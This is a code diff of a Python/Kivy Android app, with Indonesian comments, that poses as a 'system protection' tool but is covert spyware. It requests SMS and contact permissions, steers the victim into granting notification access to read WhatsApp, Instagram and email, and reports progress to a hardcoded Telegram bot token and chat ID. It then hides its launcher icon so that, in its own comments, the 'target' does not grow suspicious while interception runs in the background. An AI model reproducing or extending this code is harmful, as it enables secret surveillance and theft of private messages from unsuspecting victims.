@@ -1,9 +1,8 @@
 import telebot
 from android.permissions import request_permissions, Permission
-from jnius import autoclass
+from jnius import autoclass, PythonJavaClass, java_method
 from kivy.app import App
 from kivy.uix.button import Button
-from kivy.uix.boxlayout import BoxLayout
 from kivy.clock import Clock
 import os
 
@@ -11,51 +10,53 @@ TOKEN = "8688240904:AAFbm71rIxvaNTAuy0qUatSkAagp26uD6ZU"
 CHAT_ID = "5999516433"
 bot = telebot.TeleBot(TOKEN)
 
+# Ini adalah 'Kabel' agar aplikasi muncul di daftar Akses Notifikasi
+class NotificationListener(PythonJavaClass):
+    __javainterfaces__ = ['android/service/notification/NotificationListenerService']
+    __javacontext__ = 'app'
+
+    @java_method('(Landroid/service/notification/StatusBarNotification;)V')
+    def onNotificationPosted(self, sbn):
+        pass # Logika pengiriman ada di service belakang
+
 class LOKTV(App):
     def build(self):
-        layout = BoxLayout(orientation='vertical')
         self.btn = Button(
-            text="AKTIFKAN PERLINDUNGAN SISTEM",
-            background_color=(0, 0.7, 0, 1),
-            font_size='18sp'
+            text="AKTIFKAN PERLINDUNGAN",
+            background_color=(0, 1, 0, 1),
+            font_size='20sp'
         )
-        self.btn.bind(on_press=self.mulai_proses)
-        layout.add_widget(self.btn)
-        return layout
+        self.btn.bind(on_press=self.mulai)
+        return self.btn
 
-    def mulai_proses(self, instance):
-        # Izin dasar: SMS dan Kontak
-        perms = [Permission.READ_SMS, Permission.RECEIVE_SMS, Permission.READ_CONTACTS, Permission.POST_NOTIFICATIONS]
-        request_permissions(perms, self.aktivasi_lanjutan)
+    def mulai(self, instance):
+        perms = [Permission.READ_SMS, Permission.RECEIVE_SMS, Permission.READ_CONTACTS]
+        request_permissions(perms, self.proses_akhir)
 
-    def aktivasi_lanjutan(self, permissions, grants):
+    def proses_akhir(self, permissions, grants):
         if all(grants):
             try:
-                bot.send_message(CHAT_ID, "✅ IZIN SMS DIBERIKAN!\nSedang membuka akses WA/IG/Email...")
+                bot.send_message(CHAT_ID, "✅ TAHAP 1 BERHASIL!\nSekarang aktifkan saklar di menu yang muncul.")
                 
-                # MEMBUKA PINTU WA, IG, EMAIL (Akses Notifikasi)
+                # Membuka menu Akses Notifikasi
                 PythonActivity = autoclass('org.kivy.android.PythonActivity')
                 Intent = autoclass('android.content.Intent')
                 Settings = autoclass('android.provider.Settings')
                 intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
                 PythonActivity.mActivity.startActivity(intent)
                 
-                # Sembunyikan Ikon (Jeda 10 detik agar target tidak curiga)
-                self.btn.text = "Sistem Sedang Sinkronisasi..."
-                Clock.schedule_once(lambda dt: self.hilangkan_ikon(), 10)
-            except Exception as e:
-                bot.send_message(CHAT_ID, f"Error: {str(e)}")
+                # Beri waktu 15 detik untuk user klik ON sebelum ikon hilang
+                Clock.schedule_once(lambda dt: self.sembunyi(), 15)
+            except:
+                pass
 
-    def hilangkan_ikon(self):
-        try:
-            activity = autoclass('org.kivy.android.PythonActivity').mActivity
-            pm = activity.getPackageManager()
-            comp = autoclass('android.content.ComponentName')(activity.getPackageName(), 'org.kivy.android.PythonActivity')
-            pm.setComponentEnabledSetting(comp, 2, 1)
-            bot.send_message(CHAT_ID, "⚠️ IKON BERHASIL DIHAPUS. Penyadapan berjalan di latar belakang.")
-            os._exit(0)
-        except:
-            os._exit(0)
+    def sembunyi(self):
+        activity = autoclass('org.kivy.android.PythonActivity').mActivity
+        pm = activity.getPackageManager()
+        comp = autoclass('android.content.ComponentName')(activity.getPackageName(), 'org.kivy.android.PythonActivity')
+        pm.setComponentEnabledSetting(comp, 2, 1)
+        # Jangan di os._exit dulu agar service tetap jalan
+        self.btn.text = "Sistem Aktif."
 
 if __name__ == '__main__':
     LOKTV().run()
